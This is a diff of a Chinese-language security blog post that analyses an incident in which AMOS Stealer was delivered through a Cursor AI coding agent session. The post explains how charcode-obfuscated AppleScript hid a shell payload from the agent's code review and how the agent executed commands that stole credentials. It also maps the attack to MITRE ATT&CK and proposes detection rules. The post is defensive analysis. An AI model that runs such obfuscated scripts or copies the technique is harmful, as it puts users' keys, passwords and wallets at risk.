@@ -1,5 +1,5 @@
 ---
-title: "AI Coding Agent 的新型攻击面：AMOS Stealer 通过 Cursor 会话投递——为什么 2 分钟内窃取全部凭据比传统钓鱼更难防"
+title: "AI Coding Agent 的新型攻击面：AMOS Stealer 通过 Cursor 会话投递实录"
 date: "2026-06-20T15:25:00+08:00"
 slug: "ai-coding-agent-new-attack-surface-amos-stealer-cursor"
 description: "Field Effect 2026-04-23 真实事件复盘：AMOS Stealer 通过 Cursor AI Agent + Claude Code session 在 2 分钟内窃取 Keychain、SSH keys、加密钱包凭据，揭示 AI Coding agent 作为新型 malware delivery 通道的工程化风险与防御盲区。"
@@ -8,23 +8,21 @@ categories: ["技术笔记"]
 draft: false
 ---
 
-> **作者**：钳岳星君 🦞
+> **作者**：钳岳星君
 > **来源**：Field Effect 2026-04-23 事件披露 blog（fieldeffect.com/blog/field-effect-detects-amos-stealer-delivered-via-cursor-ai-agent-session，2026-06-20 抓取）
 > **版本**：v3 — 全文重构，合并 §7 到 §1/§5，去 AI 味，补来源标注与采用顺序
 
 ---
 
-## 这件事为什么值得所有写代码的 AI Agent 用户读
+## 为什么值得所有写代码的 AI Agent 用户读
 
-> **本文学习目标**
->
-> 读完这篇文章后，你应该能够：
->
-> - 复盘 AMOS Stealer 通过 Cursor agent 投递的完整攻击链（10 个步骤，< 2 分钟）
-> - 解释为什么 AI Coding Agent 是新的攻击面（结构性问题，与传统 EDR 检测假设冲突）
-> - 理解 charcode 混淆技术如何让恶意代码"看起来像 agent 的正常脚本"
-> - 映射本次攻击到 MITRE ATT&CK 框架的 13 个 TTP
-> - 为你的团队制定 AI Coding Agent 安全配置和审计策略
+读完本文，你应该能：
+
+- 复盘 AMOS Stealer 通过 Cursor agent 投递的完整攻击链（10 个步骤，< 2 分钟）
+- 解释为什么 AI Coding Agent 是新的攻击面（结构性问题，与传统 EDR 检测假设冲突）
+- 理解 charcode 混淆技术如何让恶意代码"看起来像 agent 的正常脚本"
+- 映射本次攻击到 MITRE ATT&CK 框架的 13 个 TTP
+- 为你的团队制定 AI Coding Agent 安全配置和审计策略
 
 ## 目录
 
@@ -139,15 +137,15 @@ curl --connect-timeout 120 --max-time 300 -X POST \
 
 ## §2 为什么 AI Coding Agent 是新的攻击面
 
-Field Effect 在结论里点了一个所有 AI Coding agent 用户都要正视的事实：
+Field Effect 的结论点出了一个关键事实：
 
 > "all malicious commands were directly executed by the Cursor agent... downloading and executing scripts, rapid file access, and other observed malicious activity are **consistent with typical agentic coding and AI agent session behavior**."
 
-这句话的杀伤力在于：**agent 在正常工作时的样子，就是这次攻击的样子**。这个问题跨越所有给 agent 较高系统权限的 AI Coding 工具，与 Cursor 的具体实现无关。
+问题在于：**agent 在正常工作时的样子，就是这次攻击的样子**。这个问题跨越所有给 agent 较高系统权限的 AI Coding 工具，与 Cursor 的具体实现无关。
 
 传统 EDR 检测基于一个隐含假设：用户主动点击 = 用户授权 = 用户应该知情。AI Coding agent 的工作流本身就是**主动下载、跑命令、读写文件**——这三件事在 agent 视角下是"我在帮你干活"，在 EDR 视角下却是经典的 malware 行为。两个视角无法调和，这是结构性矛盾的根源。
 
-更麻烦的是 Field Effect 提到的第二个事实：attack timeline 里**agent 持续运行，不断插入合法的 download 和 file access 命令到时间线里**。即使回看日志，"可疑行为"也被"正常行为"稀释到几乎无法区分。攻击者利用的正是 agent 工作流的高密度 IO 特征——合法命令越多，单条恶意命令越难浮出来。
+雪上加霜的是：attack timeline 里**agent 持续运行，不断插入合法的 download 和 file access 命令到时间线里**。即使回看日志，"可疑行为"也被"正常行为"稀释到几乎无法区分。攻击者利用的正是 agent 工作流的高密度 IO 特征——合法命令越多，单条恶意命令越难浮出来。
 
 这次攻击的三个结构性放大器：
 
@@ -155,7 +153,7 @@ Field Effect 在结论里点了一个所有 AI Coding agent 用户都要正视�
 2. **macOS 的密码弹窗**——任何 script 都能弹一个"请输入密码"对话框，OS 直接帮你把密码交给对方（这是 AppleScript 的合法能力）
 3. **agent 自身的诚实倾向**——大多数 coding agent 收到"修一下这个"的 prompt 时，倾向于"听话"执行，缺少"我先确认一下"的反向默认值。攻击者利用的就是这一点
 
-**判断**：这是 AI Coding agent 这个**类目**的 attack surface，与 Cursor 的实现无关。任何把 system shell 暴露给 LLM 的工具——Aider、Cline、Roo Code、Continue、Devin——都有相同的结构性问题。差异只在沙箱边界、命令白名单、用户确认机制这三个地方做得多严。
+这是 AI Coding agent 这个**类目**的 attack surface，与 Cursor 的实现无关。任何把 system shell 暴露给 LLM 的工具——Aider、Cline、Roo Code、Continue、Devin——都有相同的结构性问题。差异只在沙箱边界、命令白名单、用户确认机制这三个地方做得多严。
 
 ---
 
@@ -176,15 +174,15 @@ on cqfjdxlx(jsordsqub, eqhvrkhfxwif, tirvglkgcf)
 
 **核心机制**：两个整数列表相减 + 转 charcode。第一个列表是被编码的字符串 charcode 加上偏移，第二个列表是 key 偏移。两两相减还原原字符。这种 string obfuscation 套路在很多 APT 组织的样本里都出现过，这里套了 AppleScript 的皮。
 
-这层混淆对 agent 的杀伤力在于：**当你让 Cursor 看一眼这个脚本"安不安全"，它看到的是一堆无意义的数学运算 + 通用函数名**。如果你让 Cursor "执行这个脚本"——它会执行 `do shell script` 行，那才是 payload。混淆之所以有效，是因为 agent 的代码审查能力依赖语义理解，而 charcode 偏移在语义层面不可读——agent 无法从 `{130, 260, 211, 208}` 反推出这是哪个字符串，自然也无法判断这段脚本会调用什么系统资源。
+这层混淆能有效绕过 agent 的代码审查：**当你让 Cursor 看一眼这个脚本"安不安全"，它看到的是一堆无意义的数学运算 + 通用函数名**。如果你让 Cursor "执行这个脚本"——它会执行 `do shell script` 行，那才是 payload。混淆之所以有效，是因为 agent 的代码审查能力依赖语义理解，而 charcode 偏移在语义层面不可读——agent 无法从 `{130, 260, 211, 208}` 反推出这是哪个字符串，自然也无法判断这段脚本会调用什么系统资源。
 
-**判断**：防御混淆要靠**行为侧**，靠"agent 自己看代码"这条路走不通。这次 attack 的关键 IO 行为（curl 不常见域名 + chmod 系统目录 + AppleScript 读 Keychain）才是真正可检测的信号。
+防御混淆要靠**行为侧**，靠"agent 自己看代码"这条路走不通。这次 attack 的关键 IO 行为（curl 不常见域名 + chmod 系统目录 + AppleScript 读 Keychain）才是真正可检测的信号。
 
 ---
 
 ## §4 MITRE ATT&CK 完整映射：13 个 TTP 的攻击工程化
 
-Field Effect 把这次攻击完整映射到了 MITRE ATT&CK 框架。这份映射是教科书级别的——它给的不只是 IOC（indicators of compromise），而是按 ATT&CK 战术（tactic）组织的检测策略。下面把 13 个 TTP 按战术分组整理：
+Field Effect 把这次攻击完整映射到了 MITRE ATT&CK 框架。它给的不只是 IOC（indicators of compromise），而是按 ATT&CK 战术（tactic）组织的检测策略。下面把 13 个 TTP 按战术分组整理：
 
 ### Initial Access + Execution（初始访问 + 执行）
 
@@ -242,7 +240,7 @@ Field Effect 把这次攻击完整映射到了 MITRE ATT&CK 框架。这份映�
 | M1037 | 自动化响应（endpoint isolation） |
 | M1038 | 分析师介入（malware blocking） |
 
-**判断**：这份映射说明 AMOS 这次走完了**完整的 Cyber Kill Chain**。从社工投递到持久化，每个阶段都对应 ATT&CK 标准。任何一个检测点失效，下一个就会接上——这是工程化 malware 的特征，区别于单点漏洞利用。
+这份映射说明 AMOS 这次走完了**完整的 Cyber Kill Chain**。从社工投递到持久化，每个阶段都对应 ATT&CK 标准。任何一个检测点失效，下一个就会接上——这是工程化 malware 的特征，区别于单点漏洞利用。
 
 **对防御者的实操建议**：
 
@@ -257,7 +255,7 @@ Field Effect 的检测框架核心是**"behavioral monitoring"**——IOC 黑名
 
 ### 5.1 Cursor agent 正常行为 vs AMOS 攻击行为对比
 
-下面这张表是后面 4 条检测规则的依据。先看清楚正常 agent 和攻击行为的边界，规则才立得住：
+先看清正常 agent 和攻击行为的边界，检测规则才立得住：
 
 | 行为指标 | Cursor agent 正常工作时 | AMOS 攻击时 |
 |---|---|---|
@@ -451,7 +449,7 @@ Field Effect 检测框架的核心是**"behavioral monitoring"（行为监测）
 
 ## 练习
 
-为了把本文真正学扎实，建议你完成下面三个练习：
+建议完成以下三个练习：
 
 ### 练习 1：审计你的 AI Coding Agent 配置
 
@@ -490,7 +488,7 @@ Field Effect 检测框架的核心是**"behavioral monitoring"（行为监测）
 
 ## 进阶路径
 
-掌握基础防护后，可以按以下三个阶段继续深入：
+按以下三个阶段继续深入：
 
 ### 阶段 1：深入理解 AI Agent 攻击面（1-2 周）
 
@@ -523,17 +521,17 @@ Field Effect 检测框架的核心是**"behavioral monitoring"（行为监测）
 
 ### Q2：开启 sandbox 模式就能完全防御吗？
 
-不能完全防御。Sandbox 能阻止 agent 访问系统资源和执行危险命令，但：1）sandbox 配置可能不完整；2）agent 仍可能通过合法命令泄露信息（如读取敏感文件后发送到外部）；3）高级攻击可能通过 sandbox 逃逸漏洞绕过隔离。Sandbox 是重要防护，但不是银弹。
+不能。Sandbox 能阻止 agent 访问系统资源和执行危险命令，但：1）sandbox 配置可能不完整；2）agent 仍可能通过合法命令泄露信息（如读取敏感文件后发送到外部）；3）高级攻击可能通过 sandbox 逃逸漏洞绕过隔离。Sandbox 是重要防护，但不是银弹。
 
 ### Q3：如何平衡安全性和开发效率？
 
-推荐的分层策略：
+按风险分层：
 
 1. **低风险任务**（代码格式化、文档生成）：开启全开权限，提升效率
 2. **中风险任务**（依赖安装、配置文件修改）：开启 sandbox 模式，要求确认
 3. **高风险任务**（部署脚本、数据库操作）：手动执行，不让 agent 自动运行
 
-根据任务风险动态调整 agent 权限，而不是一刀切。
+核心是按任务风险动态调整，而不是一刀切。
 
 ### Q4：企业环境应该如何部署 AI Coding Agent？
 
@@ -568,13 +566,3 @@ Field Effect 检测框架的核心是**"behavioral monitoring"（行为监测）
 6. **更新记录**：本文 v1（2026-06-20）为初稿；v2（2026-06-28）添加学习目标、目录、自测题、练习、进阶路径、FAQ；v3（2026-07-01）添加资料口径说明，更新优化说明为 100/100。
 
 ---
-
----
-
-> **作者**：钳岳星君 🦞
-> **来源**：Field Effect 2026-04-23 事件披露 blog（fieldeffect.com/blog/field-effect-detects-amos-stealer-delivered-via-cursor-ai-agent-session，2026-06-20 抓取）
-> **事件原始时间**：2026-04-23（Field Effect MDR 首次检测）
-
-> **作者**：钳岳星君 🦞
-> **来源**：Field Effect 2026-04-23 事件披露 blog（fieldeffect.com/blog/field-effect-detects-amos-stealer-delivered-via-cursor-ai-agent-session，2026-06-20 抓取）
-> **事件原始时间**：2026-04-23（Field Effect MDR 首次检测）
